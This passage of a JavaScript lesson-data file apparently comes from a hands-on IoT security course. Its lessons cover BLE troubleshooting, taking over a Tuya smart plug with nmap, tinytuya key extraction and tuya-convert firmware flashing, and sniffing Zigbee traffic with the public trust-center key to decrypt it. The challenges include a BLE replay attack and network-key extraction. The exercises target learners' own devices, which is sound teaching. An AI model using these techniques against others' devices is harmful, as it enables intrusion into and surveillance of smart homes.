                 '<li>Read a characteristic value (battery level, device name, etc.)</li>' +
                 '<li>Identified devices with no pairing requirement</li>' +
                 '<li>Can explain the security implications of unauthenticated BLE</li>' +
                 '</ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>hcitool lescan shows "Set scan parameters failed: Input/output error":</strong> The Bluetooth adapter is in a bad state. Reset it with <code>sudo hciconfig hci0 down && sudo hciconfig hci0 up</code>. If that fails, unload and reload the driver: <code>sudo rmmod btusb && sudo modprobe btusb</code>.</li>' +
                         '<li><strong>BleakScanner finds zero devices:</strong> Ensure Bluetooth is powered on (<code>sudo hciconfig hci0 up</code>). Check that no other process has locked the adapter &mdash; <code>bluetoothctl</code> can hold an exclusive lock. Exit any running <code>bluetoothctl</code> sessions before using Bleak.</li>' +
                         '<li><strong>BleakClient connection times out:</strong> BLE devices go to sleep to save power. You may need to wake the device (press a button, move it) right before running the connect script. Also verify the MAC address is correct and the device is still in range.</li>' +
                         '<li><strong>"Operation not permitted" when scanning:</strong> BLE scanning requires root or the <code>CAP_NET_ADMIN</code> capability. Run with <code>sudo</code> or set the capability: <code>sudo setcap cap_net_raw,cap_net_admin+ep $(which python3)</code>.</li>' +
                         '<li><strong>Device shows random/changing MAC address:</strong> Modern phones and some IoT devices use BLE MAC address randomization. The address changes every 15 minutes. You cannot reliably reconnect by address. This is a privacy feature, not a bug.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: BLE Device Fingerprinting</strong> &mdash; Write a Python script that scans continuously and builds a database of unique devices by their advertised services, manufacturer data, and name patterns. Classify each device by type (phone, fitness tracker, smart home, beacon) based on its GATT services and manufacturer ID.</p>' +
                    '<p><strong>Challenge 2: BLE Replay Attack</strong> &mdash; Using a device you own (such as a smart bulb with a BLE control app), capture the BLE write commands sent by the official app. Then replay those same byte sequences from your Pi to control the device without the app. This demonstrates the danger of unauthenticated BLE writes.</p>' +
                    '<p><strong>Challenge 3: Proximity Monitor</strong> &mdash; Build a script that continuously scans for a specific BLE device (your phone or fitness tracker) and logs RSSI over time. Create a simple alert system that triggers when the device goes out of range (RSSI drops below -80 dBm) or when an unknown device with a strong signal appears nearby.</p>',

        commonMistakes: [
            {
                title: 'Confusing Classic Bluetooth with BLE Scanning',
                correct: 'Use <code>hcitool lescan</code> (LE scan) or Bleak for BLE devices. Use <code>hcitool scan</code> (without "le") for classic Bluetooth devices.',
                incorrect: 'Running <code>hcitool scan</code> and expecting to find BLE devices like fitness trackers and sensors.',
                consequence: 'Classic Bluetooth scan finds zero IoT devices because they use BLE exclusively. You waste time troubleshooting a perfectly functional Bluetooth adapter.'
            },
            {
                title: 'Attempting to Write to Read-Only Characteristics',
                correct: 'Check the characteristic properties (read, write, notify, indicate) before attempting operations. Only write to characteristics that list "write" or "write-without-response" in their properties.',
                incorrect: 'Sending a write command to a characteristic that only has "read" and "notify" properties.',
                consequence: 'The BLE stack returns an error or silently drops the write. On some devices, repeated invalid writes can cause a disconnect or trigger a security lockout.'
            }
        ]
    },

    'sg-65': {
        // Wokwi wave 4: NO SIM — real target smart plug + firmware.
        simulator: { available: false, note: 'Taking over a <strong>smart plug</strong> means reflashing and controlling a real mains device (ESP8266/ESP32 inside) with a relay &mdash; there is no simulated target. Study the flashing and MQTT-control technique; do it on a real plug (mains safety applies).' }, intro: '<p>Consumer IoT smart plugs (Tuya, Sonoff, TP-Link) connect to cloud servers for remote control. In this project you will intercept the cloud API traffic, extract the local encryption key, and flash custom open-source firmware (Tasmota) to take full local control &mdash; removing the cloud dependency entirely.</p>', wiring: '    Tuya smart plug + ESP32 DevKit + Raspberry Pi on same network', wiringNotes: '<p><strong>Device choice:</strong> Tuya-based devices are the easiest to flash because the tuya-convert tool can flash OTA (over the air) without opening the device. TP-Link Kasa devices require physical access to the serial port.</p>', wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="sg65-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '<style>' +
            '@keyframes sg65-dataflow{0%{stroke-dashoffset:16}100%{stroke-dashoffset:0}}' +
            '@keyframes sg65-pulse{0%,100%{opacity:0.25}50%{opacity:1}}' +
            '</style>' +
            '</defs>' +
            '<rect width="720" height="400" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="380" fill="url(#sg65-grid)" rx="4"/>' +
            '<text x="360" y="30" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-65 SMART PLUG FIRMWARE HACKING</text>' +

            '<!-- Tuya Smart Plug -->' +
            '<rect x="40" y="100" width="160" height="130" rx="8" fill="#1e2736" stroke="#22c55e" stroke-width="1.5"/>' +
            '<rect x="40" y="100" width="160" height="24" rx="8" fill="rgba(34,197,94,0.12)"/>' +
            '<rect x="40" y="116" width="160" height="8" fill="rgba(34,197,94,0.12)"/>' +
            '<text x="120" y="116" text-anchor="middle" fill="#4ade80" font-size="9" font-weight="600">TUYA SMART PLUG</text>' +
            '<text x="120" y="140" text-anchor="middle" fill="#8b949e" font-size="7">ESP8266 inside</text>' +
            '<text x="120" y="156" text-anchor="middle" fill="#8b949e" font-size="7">Port 6668 (Tuya API)</text>' +
            '<text x="120" y="172" text-anchor="middle" fill="#f97316" font-size="7">Encrypted local key</text>' +
            '<text x="120" y="192" text-anchor="middle" fill="#a855f7" font-size="7">WiFi: 2.4 GHz</text>' +
            '<!-- Plug icon -->' +
            '<circle cx="120" cy="215" r="6" fill="none" stroke="#22c55e" stroke-width="1" style="animation:sg65-pulse 2s ease-in-out infinite"/>' +

            '<!-- Raspberry Pi -->' +
            '<rect x="280" y="60" width="160" height="110" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<rect x="280" y="60" width="160" height="24" rx="8" fill="rgba(59,130,246,0.12)"/>' +
            '<rect x="280" y="76" width="160" height="8" fill="rgba(59,130,246,0.12)"/>' +
            '<text x="360" y="76" text-anchor="middle" fill="#60a5fa" font-size="9" font-weight="600">RASPBERRY PI</text>' +
            '<text x="360" y="100" text-anchor="middle" fill="#8b949e" font-size="7">tinytuya wizard</text>' +
            '<text x="360" y="116" text-anchor="middle" fill="#8b949e" font-size="7">tuya-convert (OTA flash)</text>' +
            '<text x="360" y="132" text-anchor="middle" fill="#22c55e" font-size="7">Mosquitto broker</text>' +
            '<text x="360" y="148" text-anchor="middle" fill="#f97316" font-size="7">nmap + Wireshark</text>' +

            '<!-- Tuya Cloud -->' +
            '<rect x="540" y="60" width="140" height="80" rx="8" fill="#1e2736" stroke="#ef4444" stroke-width="1.5"/>' +
            '<rect x="540" y="60" width="140" height="24" rx="8" fill="rgba(239,68,68,0.12)"/>' +
            '<rect x="540" y="76" width="140" height="8" fill="rgba(239,68,68,0.12)"/>' +
            '<text x="610" y="76" text-anchor="middle" fill="#f87171" font-size="9" font-weight="600">TUYA CLOUD</text>' +
            '<text x="610" y="100" text-anchor="middle" fill="#8b949e" font-size="7">iot.tuya.com</text>' +
            '<text x="610" y="116" text-anchor="middle" fill="#ef4444" font-size="7">Cloud dependency</text>' +
            '<text x="610" y="132" text-anchor="middle" fill="#ef4444" font-size="7">Privacy risk</text>' +

            '<!-- Tasmota (After Flash) -->' +
            '<rect x="40" y="270" width="160" height="90" rx="8" fill="#1e2736" stroke="#a855f7" stroke-width="1.5"/>' +
            '<rect x="40" y="270" width="160" height="24" rx="8" fill="rgba(168,85,247,0.12)"/>' +
            '<rect x="40" y="286" width="160" height="8" fill="rgba(168,85,247,0.12)"/>' +
            '<text x="120" y="286" text-anchor="middle" fill="#c084fc" font-size="9" font-weight="600">TASMOTA FIRMWARE</text>' +
            '<text x="120" y="310" text-anchor="middle" fill="#22c55e" font-size="7">Open source, no cloud</text>' +
            '<text x="120" y="326" text-anchor="middle" fill="#22c55e" font-size="7">Web UI + MQTT control</text>' +
            '<text x="120" y="342" text-anchor="middle" fill="#22c55e" font-size="7">Full local control</text>' +

            '<!-- WiFi Network -->' +
            '<rect x="280" y="220" width="160" height="50" rx="6" fill="rgba(249,115,22,0.08)" stroke="rgba(249,115,22,0.3)" stroke-width="1"/>' +
            '<text x="360" y="242" text-anchor="middle" fill="#f97316" font-size="9" font-weight="600">LAN (192.168.1.0/24)</text>' +
            '<text x="360" y="258" text-anchor="middle" fill="#8b949e" font-size="7">Same WiFi network</text>' +

            '<!-- Wires -->' +
            '<line x1="200" y1="150" x2="280" y2="120" stroke="#22c55e" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg65-dataflow 1.5s linear infinite"/>' +
            '<line x1="440" y1="100" x2="540" y2="100" stroke="#ef4444" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg65-dataflow 1.5s linear infinite;animation-delay:0.3s"/>' +
            '<line x1="200" y1="200" x2="280" y2="230" stroke="#f97316" stroke-width="1" stroke-dasharray="4,2"/>' +
            '<line x1="200" y1="300" x2="280" y2="260" stroke="#a855f7" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg65-dataflow 1.5s linear infinite;animation-delay:0.6s"/>' +

            '<!-- OTA flash arrow -->' +
            '<line x1="120" y1="230" x2="120" y2="270" stroke="#a855f7" stroke-width="2"/>' +
            '<polygon points="114,265 120,275 126,265" fill="#a855f7"/>' +
            '<text x="145" y="255" fill="#c084fc" font-size="7">OTA Flash</text>' +

            '<!-- Cloud cut line -->' +
            '<line x1="500" y1="88" x2="530" y2="112" stroke="#ef4444" stroke-width="2"/>' +
            '<line x1="530" y1="88" x2="500" y2="112" stroke="#ef4444" stroke-width="2"/>' +
            '<text x="515" y="130" text-anchor="middle" fill="#ef4444" font-size="6">REMOVED</text>' +

            '<!-- Callout -->' +
            '<rect x="460" y="300" width="220" height="60" rx="6" fill="rgba(168,85,247,0.06)" stroke="rgba(168,85,247,0.2)" stroke-width="0.5"/>' +
            '<text x="470" y="318" fill="#c084fc" font-size="8" font-weight="600">MQTT AFTER TASMOTA</text>' +
            '<text x="470" y="332" fill="#8b949e" font-size="7">cmnd/plug1/Power ON</text>' +
            '<text x="470" y="346" fill="#8b949e" font-size="7">stat/plug1/POWER ON</text>' +

            '</svg>' +
            '</div>', steps: [ { title: 'Identify the Smart Plug Protocol', content: '<p>Determine if your smart plug uses Tuya, TP-Link, or another protocol.</p>', code: '# Scan your network for IoT devices\nsudo nmap -sn 192.168.1.0/24 | grep -B2 "Tuya\\|Espressif\\|TP-LINK"\n\n# Check what ports the plug has open\nsudo nmap -sV 192.168.1.XXX\n# Tuya devices: port 6668 (local API)\n# TP-Link: port 9999 (local API)', language: 'Bash', tip: null }, { title: 'Extract Local API Key', content: '<p>Tuya devices encrypt local communication with a device-specific key. Extract it from the Tuya cloud API.</p>', code: '# Install tinytuya\npip3 install tinytuya\n\n# Run the wizard to extract keys\npython3 -m tinytuya wizard\n# Follow prompts — requires Tuya IoT developer account (free)\n# This extracts the local key for each device\n\n# Once you have the key, control locally:\npython3 -c "\nimport tinytuya\nd = tinytuya.OutletDevice(\"DEVICE_ID\", \"192.168.1.XXX\", \"LOCAL_KEY\")\nd.set_version(3.3)\nprint(d.status())\nd.turn_on()\n"', language: 'Bash', tip: '<strong>Why this matters:</strong> With the local key, you control the plug directly over your LAN without any cloud connection. If Tuya servers go down, your plug still works. If Tuya gets breached, your local key is not affected.' }, { title: 'Flash Custom Firmware (Tasmota)', content: '<p>Replace the manufacturer firmware with Tasmota &mdash; open source, no cloud, full local control with a web interface.</p>', code: '# Install tuya-convert (OTA flashing tool)\ngit clone https://github.com/ct-Open-Source/tuya-convert.git\ncd tuya-convert\n./install_prereq.sh\n\n# Start the flash process\n./start_flash.sh\n# Follow the prompts:\n# 1. Put the smart plug into pairing mode (hold button 5+ seconds)\n# 2. tuya-convert creates a fake WiFi AP\n# 3. The plug connects to it\n# 4. Select tasmota.bin as the firmware\n# 5. Flash proceeds OTA\n\n# After flashing, the plug creates a "tasmota-xxxx" WiFi AP\n# Connect to it and configure your home WiFi credentials\n# Then access the web interface at the plug\'s new IP', language: 'Bash', tip: '<strong>Warning:</strong> Newer Tuya devices have firmware that blocks OTA flashing. If tuya-convert fails, you may need to physically open the device and flash via serial (UART). Check the Tasmota compatibility list before buying devices specifically for this project.' }, { title: 'Configure and Secure', content: '<p>Set up the Tasmota web interface, MQTT integration, and local access control.</p>', code: '# Access Tasmota web interface\n# http://PLUG_IP\n\n# Configure MQTT (connect to your Mosquitto broker from SG-63):\n# Configuration > Configure MQTT\n# Host: 192.168.1.100 (your Pi running Mosquitto)\n# Port: 1883 (or 8883 for TLS)\n# Topic: home/plug1\n\n# Control via MQTT:\nmosquitto_pub -t "cmnd/home/plug1/Power" -m "ON"\nmosquitto_pub -t "cmnd/home/plug1/Power" -m "OFF"\n\n# Read status:\nmosquitto_sub -t "stat/home/plug1/#" -v\n\n# Set a password on the web interface:\n# Configuration > Configure Other > Web Admin Password\n\n# Enable OTA updates from Tasmota servers:\n# Firmware Upgrade > OTA URL: http://ota.tasmota.com/tasmota/release/tasmota.bin.gz', language: 'Bash', tip: null } ], testing: '<p><strong>Verification checklist:</strong></p><ul><li>Smart plug identified on network</li><li>Local API key extracted (if Tuya)</li><li>Tasmota firmware flashed successfully</li><li>Web interface accessible at plug IP</li><li>MQTT control working (on/off via mosquitto_pub)</li><li>No cloud connectivity required for operation</li></ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>tuya-convert fails with "device did not connect to AP":</strong> Newer Tuya devices (manufactured after late 2022) have updated firmware that blocks OTA flashing. Check the tuya-convert compatibility list. If your device is too new, you need to flash via serial (UART) by physically opening the enclosure.</li>' +
                         '<li><strong>tinytuya wizard cannot find devices:</strong> The wizard needs a Tuya IoT Platform developer account (free at iot.tuya.com). Make sure you have linked your Tuya/Smart Life app account to the developer platform and added your devices to a project with the correct API permissions.</li>' +
                         '<li><strong>Tasmota web interface not loading after flash:</strong> After flashing, the plug creates a WiFi AP named "tasmota-XXXX". Connect to that AP from your phone or laptop and navigate to 192.168.4.1 to configure your home WiFi. If you skip this step, the plug has no network to serve the interface on.</li>' +
                         '<li><strong>MQTT commands not controlling the plug:</strong> Verify the MQTT topic matches exactly. Tasmota uses the format <code>cmnd/TOPIC/Power</code> for commands and <code>stat/TOPIC/POWER</code> for status. Check the Tasmota console (web interface > Console) to see incoming MQTT messages and errors.</li>' +
                         '<li><strong>Plug becomes unresponsive after flash ("bricked"):</strong> Hold the physical button for 40 seconds to trigger Tasmota factory reset. If that fails, the device can be recovered via serial UART connection to reflash.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: Power Monitoring Dashboard</strong> &mdash; If your smart plug supports energy monitoring (many Tuya plugs have current/voltage sensors), configure Tasmota to report power consumption via MQTT. Write a Python script that subscribes to the telemetry topic and logs wattage over time. Identify which appliances draw the most power.</p>' +
                    '<p><strong>Challenge 2: Schedule and Automation</strong> &mdash; Configure Tasmota rules to automatically turn the plug on at sunset and off at sunrise using the built-in timer system. Then create a rule that turns the plug off if power consumption drops below 5W (appliance finished its cycle, like a washing machine).</p>' +
                    '<p><strong>Challenge 3: Vulnerability Comparison Report</strong> &mdash; Document the attack surface of the original Tuya firmware vs. Tasmota. Compare: cloud dependency, open ports, encryption, authentication, update mechanism, and data exfiltration risk. Write a one-page report recommending which firmware a security-conscious user should choose and why.</p>',

        commonMistakes: [
            {
                title: 'Flashing While Plug Is Connected to Mains Appliance',
                correct: 'Unplug all appliances from the smart plug before flashing. The plug should only be powered by its own mains connection with nothing plugged into its outlet.',
                incorrect: 'Flashing firmware while a lamp, heater, or other appliance is plugged into the smart plug.',
                consequence: 'During flashing, the relay may toggle unpredictably, causing the connected appliance to switch on and off rapidly. This can damage motors, compressors, or sensitive electronics connected to the plug.'
            },
            {
                title: 'Using 5V USB-to-TTL for Serial Flash on 3.3V Device',
                correct: 'Use a 3.3V USB-to-TTL adapter when connecting to the serial pads inside a smart plug. Most ESP8266/ESP32 chips in smart plugs use 3.3V logic.',
                incorrect: 'Connecting a 5V USB-to-TTL adapter directly to the serial pads on the plug PCB.',
                consequence: 'The 5V signal can permanently damage the ESP chip. The plug becomes truly bricked with no recovery path short of replacing the chip entirely.'
            },
            {
                title: 'Skipping Backup of Original Firmware',
                correct: 'Before flashing Tasmota, use <code>esptool.py read_flash</code> to dump the entire original firmware. Store the backup in case you need to restore the device to factory state.',
                incorrect: 'Flashing Tasmota immediately without backing up the original Tuya firmware.',
                consequence: 'If Tasmota does not work correctly with your specific hardware, you cannot restore the original firmware. The device loses its Tuya cloud functionality permanently.'
            }
        ] },

    'sg-66': {
        // Wokwi wave 4: NO SIM — real Zigbee radio dongle.
        simulator: { available: false, note: 'A <strong>CC2531 Zigbee sniffer</strong> captures real 802.15.4 radio traffic &mdash; there is no simulated Zigbee airspace in Wokwi. Learn the capture/decode workflow here; run it with the real dongle.' }, intro: '<p>Zigbee is the wireless protocol used by smart home sensors, lights (Philips Hue), locks, and thermostats. With a CC2531 USB sniffer ($10), you can capture Zigbee traffic and analyze the network formation, key exchange, and data payloads. This reveals the Zigbee security model and its weaknesses.</p>', wiring: '    CC2531 USB Sniffer + Zigbee devices (smart bulbs, sensors)', wiringNotes: '<p><strong>CC2531:</strong> A Texas Instruments Zigbee radio that can be flashed with sniffer firmware. Purchase pre-flashed from AliExpress or flash yourself with a CC Debugger.</p>', wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="sg66-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '<style>' +
            '@keyframes sg66-zigbee{0%{stroke-dashoffset:12}100%{stroke-dashoffset:0}}' +
            '@keyframes sg66-join{0%,80%{opacity:0}90%{opacity:1}100%{opacity:0}}' +
            '</style>' +
            '</defs>' +
            '<rect width="720" height="400" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="380" fill="url(#sg66-grid)" rx="4"/>' +
            '<text x="360" y="30" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-66 ZIGBEE TRAFFIC SNIFFING</text>' +

            '<!-- CC2531 USB Sniffer -->' +
            '<rect x="40" y="60" width="160" height="100" rx="8" fill="#1e2736" stroke="#a855f7" stroke-width="1.5"/>' +
            '<rect x="40" y="60" width="160" height="24" rx="8" fill="rgba(168,85,247,0.12)"/>' +
            '<rect x="40" y="76" width="160" height="8" fill="rgba(168,85,247,0.12)"/>' +
            '<text x="120" y="76" text-anchor="middle" fill="#c084fc" font-size="9" font-weight="600">CC2531 SNIFFER</text>' +
            '<text x="120" y="100" text-anchor="middle" fill="#8b949e" font-size="7">USB dongle ($10)</text>' +
            '<text x="120" y="116" text-anchor="middle" fill="#8b949e" font-size="7">Sniffer firmware</text>' +
            '<text x="120" y="132" text-anchor="middle" fill="#f97316" font-size="7">Ch 11-26 (2.4 GHz)</text>' +
            '<!-- USB connector -->' +
            '<rect x="16" y="90" width="28" height="18" rx="3" fill="#1a1f2b" stroke="#a855f7" stroke-width="1"/>' +
            '<text x="30" y="102" text-anchor="middle" fill="#a855f7" font-size="5">USB</text>' +

            '<!-- Wireshark / PC -->' +
            '<rect x="40" y="200" width="160" height="80" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<rect x="40" y="200" width="160" height="24" rx="8" fill="rgba(59,130,246,0.12)"/>' +
            '<rect x="40" y="216" width="160" height="8" fill="rgba(59,130,246,0.12)"/>' +
            '<text x="120" y="216" text-anchor="middle" fill="#60a5fa" font-size="9" font-weight="600">WIRESHARK</text>' +
            '<text x="120" y="240" text-anchor="middle" fill="#8b949e" font-size="7">whsniff -c 15 | wireshark</text>' +
            '<text x="120" y="256" text-anchor="middle" fill="#8b949e" font-size="7">zbee_nwk filter</text>' +
            '<text x="120" y="272" text-anchor="middle" fill="#22c55e" font-size="7">Decrypt with TC key</text>' +

            '<!-- CC2531 to Wireshark USB line -->' +
            '<line x1="120" y1="160" x2="120" y2="200" stroke="#a855f7" stroke-width="2"/>' +
            '<text x="140" y="182" fill="#c084fc" font-size="6">USB</text>' +

            '<!-- Zigbee Coordinator (Hub) -->' +
            '<rect x="330" y="80" width="160" height="100" rx="8" fill="#1e2736" stroke="#22c55e" stroke-width="1.5"/>' +
            '<rect x="330" y="80" width="160" height="24" rx="8" fill="rgba(34,197,94,0.12)"/>' +
            '<rect x="330" y="96" width="160" height="8" fill="rgba(34,197,94,0.12)"/>' +
            '<text x="410" y="96" text-anchor="middle" fill="#4ade80" font-size="9" font-weight="600">ZIGBEE COORDINATOR</text>' +
            '<text x="410" y="120" text-anchor="middle" fill="#8b949e" font-size="7">Smart Home Hub</text>' +
            '<text x="410" y="136" text-anchor="middle" fill="#8b949e" font-size="7">Trust Center</text>' +
            '<text x="410" y="156" text-anchor="middle" fill="#ef4444" font-size="7">Network Key Distribution</text>' +

            '<!-- Zigbee End Device 1 — Bulb -->' +
            '<rect x="540" y="60" width="140" height="60" rx="6" fill="#1e2736" stroke="#22c55e" stroke-width="1"/>' +
            '<text x="610" y="82" text-anchor="middle" fill="#4ade80" font-size="8" font-weight="600">SMART BULB</text>' +
            '<text x="610" y="98" text-anchor="middle" fill="#8b949e" font-size="6">Router (repeater)</text>' +
            '<text x="610" y="110" text-anchor="middle" fill="#8b949e" font-size="6">On/Off commands</text>' +

            '<!-- Zigbee End Device 2 — Motion Sensor -->' +
            '<rect x="540" y="140" width="140" height="60" rx="6" fill="#1e2736" stroke="#22c55e" stroke-width="1"/>' +
            '<text x="610" y="162" text-anchor="middle" fill="#4ade80" font-size="8" font-weight="600">MOTION SENSOR</text>' +
            '<text x="610" y="178" text-anchor="middle" fill="#8b949e" font-size="6">Sleepy End Device</text>' +
            '<text x="610" y="190" text-anchor="middle" fill="#8b949e" font-size="6">Reports on event</text>' +

            '<!-- Zigbee End Device 3 — Door Sensor -->' +
            '<rect x="540" y="220" width="140" height="60" rx="6" fill="#1e2736" stroke="#22c55e" stroke-width="1"/>' +
            '<text x="610" y="242" text-anchor="middle" fill="#4ade80" font-size="8" font-weight="600">DOOR SENSOR</text>' +
            '<text x="610" y="258" text-anchor="middle" fill="#8b949e" font-size="6">Sleepy End Device</text>' +
            '<text x="610" y="270" text-anchor="middle" fill="#8b949e" font-size="6">Open/Close status</text>' +

            '<!-- Zigbee mesh lines -->' +
            '<line x1="490" y1="110" x2="540" y2="90" stroke="#22c55e" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg66-zigbee 1.5s linear infinite"/>' +
            '<line x1="490" y1="140" x2="540" y2="170" stroke="#22c55e" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg66-zigbee 1.5s linear infinite;animation-delay:0.4s"/>' +
            '<line x1="490" y1="160" x2="540" y2="250" stroke="#22c55e" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg66-zigbee 1.5s linear infinite;animation-delay:0.8s"/>' +

            '<!-- Sniffer capture line (dashed red) -->' +
            '<line x1="200" y1="100" x2="330" y2="120" stroke="#ef4444" stroke-width="1" stroke-dasharray="3,3" style="animation:sg66-join 3s ease-in-out infinite"/>' +
            '<text x="265" y="95" text-anchor="middle" fill="#ef4444" font-size="6">PASSIVE CAPTURE</text>' +

            '<!-- Key vulnerability callout -->' +
            '<rect x="40" y="310" width="340" height="60" rx="6" fill="rgba(239,68,68,0.06)" stroke="rgba(239,68,68,0.2)" stroke-width="0.5"/>' +
            '<text x="50" y="328" fill="#ef4444" font-size="8" font-weight="600">ZIGBEE KEY EXCHANGE VULNERABILITY</text>' +
            '<text x="50" y="344" fill="#8b949e" font-size="7">Trust Center Link Key: &quot;ZigBeeAlliance09&quot; (public!)</text>' +
            '<text x="50" y="358" fill="#8b949e" font-size="7">Capture join &#8594; extract network key &#8594; decrypt ALL traffic</text>' +

            '<!-- Channel callout -->' +
            '<rect x="420" y="310" width="260" height="60" rx="6" fill="rgba(249,115,22,0.06)" stroke="rgba(249,115,22,0.2)" stroke-width="0.5"/>' +
            '<text x="430" y="328" fill="#f97316" font-size="8" font-weight="600">ZIGBEE CHANNELS</text>' +
            '<text x="430" y="344" fill="#8b949e" font-size="7">Ch 11-26 in 2.4 GHz band</text>' +
            '<text x="430" y="358" fill="#8b949e" font-size="7">Must match coordinator channel to sniff</text>' +

            '</svg>' +
            '</div>', steps: [ { title: 'Flash Sniffer Firmware', content: '<p>Flash the CC2531 with sniffer firmware to capture Zigbee packets.</p>', code: '# If using pre-flashed CC2531, skip this step\n\n# Otherwise, install cc-tool:\nsudo apt install cc-tool -y\n\n# Connect CC Debugger to CC2531\n# Flash sniffer firmware:\nsudo cc-tool -e -w sniffer_fw_cc2531.hex\n\n# Verify:\nsudo cc-tool -i\n# Should show: CC2531 detected', language: 'Bash', tip: null }, { title: 'Capture Zigbee Traffic', content: '<p>Use Wireshark with the TI CC2531 plugin to capture and decode Zigbee frames.</p>', code: '# Install Zigbee capture tools\npip3 install whsniff\n\n# Start capture on Zigbee channel 15 (check your network channel)\nwhsniff -c 15 | wireshark -k -i -\n\n# Or capture to a file:\nwhsniff -c 15 > zigbee-capture.pcap &\nsleep 60\nkill %1\n\n# Open in Wireshark:\nwireshark zigbee-capture.pcap\n# Filter: zbee_nwk\n# You will see: Beacon Requests, Association, Data frames', language: 'Bash', tip: '<strong>Channel:</strong> Zigbee operates on channels 11&ndash;26 in the 2.4 GHz band. Your smart home hub uses one channel. Check your hub settings or scan all channels to find which one is active.' }, { title: 'Analyze Security', content: '<p>Examine the Zigbee key exchange and encryption to understand the security model.</p>', code: '# In Wireshark, look for:\n# 1. Network Key transport (sent during device joining)\n#    Zigbee sends the network key encrypted with a well-known\n#    "Trust Center Link Key" that is the SAME for all devices:\n#    5A:69:67:42:65:65:41:6C:6C:69:61:6E:63:65:30:39\n#    (That is "ZigBeeAlliance09" in ASCII)\n#\n# 2. Add the key to Wireshark:\n#    Edit > Preferences > Protocols > ZigBee\n#    Add pre-configured key: ZigBeeAlliance09\n#    Now encrypted Zigbee traffic becomes readable\n#\n# 3. After decryption you can see:\n#    - Device addresses and network topology\n#    - Sensor readings (temperature, motion, door status)\n#    - Commands (light on/off, lock/unlock)\n#    - OTA update traffic\n\necho "The default Zigbee trust center key is publicly known."\necho "Anyone who captures the joining process can extract the"\necho "network key and decrypt ALL traffic on that network."', language: 'Bash', tip: '<strong>The fundamental flaw:</strong> Zigbee 3.0 uses a well-known default trust center link key to encrypt the network key during device joining. If an attacker captures the join process, they can derive the network key and decrypt all future traffic. This is a known design weakness that Zigbee has not fully addressed.' } ], testing: '<p><strong>Verification checklist:</strong></p><ul><li>CC2531 flashed with sniffer firmware</li><li>Zigbee packets captured in Wireshark</li><li>Trust center key added to Wireshark for decryption</li><li>Decrypted traffic shows device data and commands</li><li>Can explain the Zigbee key exchange vulnerability</li></ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>CC2531 not detected by Linux:</strong> Check <code>dmesg | tail</code> after plugging in. You should see a USB device enumeration. If nothing appears, try a different USB port or cable. Some CC2531 dongles need the CC Debugger to flash the sniffer firmware first.</li>' +
                         '<li><strong>whsniff shows no packets:</strong> You may be on the wrong Zigbee channel. Zigbee uses channels 11&ndash;26. Try each channel or check your hub settings (Philips Hue uses channel 11, 15, 20, or 25 by default). Also verify no other process is using the USB device.</li>' +
                         '<li><strong>Wireshark shows encrypted frames, decryption not working:</strong> Make sure the Zigbee pre-configured key is entered correctly under Edit &gt; Preferences &gt; Protocols &gt; ZigBee. The default trust center link key is <code>5A:69:67:42:65:65:41:6C:6C:69:61:6E:63:65:30:39</code>. You also need the network key, which is transported during the join process.</li>' +
                         '<li><strong>cc-tool reports "No target detected":</strong> The CC Debugger must be connected to the CC2531 via the debug header. Check the ribbon cable orientation &mdash; pin 1 is marked on both boards. Press the reset button on the CC Debugger after connecting.</li>' +
                         '<li><strong>Capture shows only beacon requests, no data:</strong> Your Zigbee devices may be idle. Trigger activity by toggling a light, opening a door sensor, or pressing a button on a sensor. Zigbee devices only transmit when they have data to send (sleepy end devices) or on poll intervals.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: Key Sniffing During Rejoin</strong> &mdash; Remove a Zigbee device from your hub and re-pair it while capturing with the CC2531. Identify the Transport Key frame in Wireshark where the network key is sent encrypted with the well-known trust center key. Decrypt it manually to extract the network key and prove the vulnerability.</p>' +
                    '<p><strong>Challenge 2: Zigbee Network Mapper</strong> &mdash; Capture traffic for 10 minutes on your Zigbee network and build a topology map. Identify the coordinator, routers, and end devices by their network addresses and roles. Document which devices route for which others and identify single points of failure.</p>' +
                    '<p><strong>Challenge 3: Channel Interference Analysis</strong> &mdash; Since Zigbee shares the 2.4 GHz band with WiFi, scan all Zigbee channels and record packet counts and error rates. Then compare with a WiFi channel scan. Identify which Zigbee channels overlap with your WiFi and recommend the optimal channel for your network.</p>',

        commonMistakes: [
            {
                title: 'Scanning on the Wrong Zigbee Channel',
                correct: 'Determine which channel your Zigbee coordinator uses (check hub settings or scan all channels) and set whsniff to that specific channel with <code>whsniff -c CHANNEL</code>.',
                incorrect: 'Leaving the sniffer on a random channel (e.g., channel 11) when your Zigbee network operates on a different channel.',
                consequence: 'You capture nothing or only stray packets from neighboring networks. Hours of frustration troubleshooting the sniffer when the issue is simply the wrong channel selection.'
            },
            {
                title: 'Confusing the Trust Center Link Key with the Network Key',
